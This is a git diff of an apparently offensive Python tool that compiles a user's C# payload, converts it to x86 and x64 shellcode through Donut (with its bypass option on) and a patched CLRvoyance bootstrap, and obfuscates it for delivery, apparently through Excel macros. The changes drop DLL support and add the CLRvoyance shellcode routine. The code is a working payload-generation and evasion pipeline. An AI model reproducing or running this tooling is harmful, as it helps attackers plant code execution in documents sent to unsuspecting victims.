@@ -7,15 +7,12 @@ from shutil import which
 import pandas as pd
 from io import StringIO
 
-
 '''
 Usage: 
 	python3 excelntdonut.py -f source.cs --obfuscate --sandbox
 
 Options:
 	-f source.cs           C# source code (your payload must execute within the main() function)
-	-c classname		   (required for DLL. This is the classname for the method you want to run)
-	-m methodname          (required for DLL. This is the method you want to call)
 	-r 'System.Management' References needed to compile your C# code (same ones for when using mcs to compile on Linux)
 	-o 'output.txt'        Output filename. Defaults to excelentdonut.txt
 	--obfuscate            Run obfuscation framework
@@ -43,10 +40,10 @@ def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-f", dest="inputFileName", help="Path to C# source code for a .NET DLL or EXE", \
 	 required=True)
-	parser.add_argument("-c", dest="className", help="(Required for DLLs) name of class where \
-		payload method lives.", required=False, default="")
-	parser.add_argument("-m", dest="methodName", help="(Required for DLLs) name of method \
-		which executes your  payload", required=False, default="")
+	#parser.add_argument("-c", dest="className", help="(Required for DLLs) name of class where \
+	#	payload method lives.", required=False, default="")
+	#parser.add_argument("-m", dest="methodName", help="(Required for DLLs) name of method \
+	#	which executes your  payload", required=False, default="")
 	parser.add_argument("-r", dest="references", type=str, help="References needed for compiling \
 		your C# source code. These would be the same as if you were compiling it using \
 		MCS on linux. Ex: 'System.Management,....,...'", required=False, )
@@ -63,15 +60,16 @@ def main():
 		print("[!] Could not open or read file [{}]".format(args.inputFileName))
 		sys.exit()
 
+	#ONLY EXE COMPATIBLE AT THE MOMENT
 	#Check for both class and method or neither
-	if args.className:
-		if not args.methodName:
-			print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
-			sys.exit()
-	else:
-		if args.methodName:
-			print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
-			sys.exit()
+	#if args.className:
+	#	if not args.methodName:
+	#		print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
+	#		sys.exit()
+	#else:
+	#	if args.methodName:
+	#		print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
+	#		sys.exit()
 
 	#Generate shellcode in x86 and x64 archs 
 	x86Shellcode, x86Size, x86Count = generateShellcode(args,'x86')
@@ -157,19 +155,14 @@ def runtimeCheck():
 
 def generateShellcode(args, arch):
 
-	#In Donut x86=1 and amd64=2, not using x64+x86 since
-	#sometimes compiling for "Any Computer" does weird things.
-	if arch == "x86":
-		donutArch = 1
-	else:
-		donutArch = 2
-
+	#ONLY EXE Working at the moment
 	#If user provided source code is a DLL, make sure update
 	# the target param for MCS compilation
-	if args.methodName:
-		target = "library"
-	else:
-		target = "exe"
+	#if args.methodName:
+	#	target = "library"
+	#else:
+	#	target = "exe"
+	target = 'exe'
 
 	#Generate random string for temp file storage
 	randStr = ''.join(random.choice(string.ascii_letters) for x in range(random.randrange(6, 12)))
@@ -191,10 +184,17 @@ def generateShellcode(args, arch):
 			print("[x] Error in generating " + arch + " .NET assembly using MCS. See error message above.")
 			sys.exit()
 
-	#Using donut to transform into bin file (shellcode)
-	#Note: not using Donut's AMSI bypass since XLM doesn't require it + in case it's signatured
+
+
+	#Using donut to transform x86 into bin file (shellcode)
+	#Using CLRvoyance to transfer x64 into bin file (shellcode)
+	#Why donut and CLRvoyance? Had architecture issues and this is what worked. Might change
+	# in the future.
 	print("[i] Generating shellcode from " + arch + " .NET assembly file.")
-	s = donut.create(file=randExeName, arch=donutArch, bypass=1, cls=args.className, method=args.methodName)
+	if arch == "x86":
+		s = donut.create(file=randExeName, arch=1, bypass=1)
+	else:
+		s = generateCLRvoyanceShellcode(randExeName)
 	os.system("rm " + randExeName)
 	with open(randBinName,'wb+') as f:
 		f.write(s)
@@ -507,6 +507,46 @@ def generateObfuscatedInstructions(args,x86Size, x64Size, offset, x86Count, x64C
 		columnA += sentence
 
 	return columnA, dfD
+
+def generateCLRvoyanceShellcode(assembly):
+	'''
+	Made a few small edits to the "run" function
+	from the clrvoyance.py file within the CLRvoyance
+	repository. Since EXCLEntDonut didn't need the
+	entire repo, there's only the required files in the 
+	/CLRvoyance subfolder. To see the entire project,
+	please visit: https://github.com/Accenture/CLRvoyance/
+	'''
+
+	path = os.path.dirname(os.path.realpath(__file__))
+	assembly = open(assembly, 'rb').read()
+	bootstrap = open(path + "/CLRvoyance/sc-64-clr", 'rb').read()
+	first_sab = bootstrap.find(b"AAAA")
+	if not first_sab or first_sab == 0:
+		print('[-] Length not found in bootstrap!')
+		sys.exit(1)
+
+	second_memcpy = bootstrap[first_sab+1:].find(b"AAAA")
+	if not second_memcpy or second_memcpy == 0:
+		print('[-] Length not found in bootstrap (memcpy)!')
+		sys.exit(1)
+
+	assembly_len = struct.pack("<I", len(assembly))
+
+	# pack new length for SafeArrayBounds and memcpy
+	_bootstrap = list(bootstrap)[:-1]
+	_bootstrap[first_sab] = assembly_len[0]
+	_bootstrap[first_sab+1] = assembly_len[1]
+	_bootstrap[first_sab+2] = assembly_len[2]
+	_bootstrap[first_sab+3] = assembly_len[3]
+
+	_bootstrap[first_sab+1+second_memcpy] = assembly_len[0]
+	_bootstrap[first_sab+1+second_memcpy+1] = assembly_len[1]
+	_bootstrap[first_sab+1+second_memcpy+2] = assembly_len[2]
+	_bootstrap[first_sab+1+second_memcpy+3] = assembly_len[3]
+
+	assembled = bytes(_bootstrap) + assembly
+	return assembled
 
 
 def finalize():
